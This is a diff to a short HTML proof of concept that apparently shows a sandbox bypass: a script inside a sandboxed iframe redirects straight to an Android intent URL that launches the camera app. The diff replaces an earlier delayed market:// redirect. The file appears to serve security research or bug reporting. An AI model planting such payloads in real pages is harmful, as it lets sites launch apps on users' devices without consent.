@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
   <body>
+    <h3>PoC: Camera App Auto-Launch via Sandboxed Iframe</h3>
+
     <iframe sandbox="allow-scripts" srcdoc="
       <script>
-        setTimeout(() => {
-          location.href = 'market://details?id=com.sec.android.app.popupcalculator';
-        }, 50);
+        location.href = 'intent://android.media.action.IMAGE_CAPTURE#Intent;scheme=android-app;end';
       </script>
-    ">
-    </iframe>
+    "></iframe>
+
   </body>
 </html>
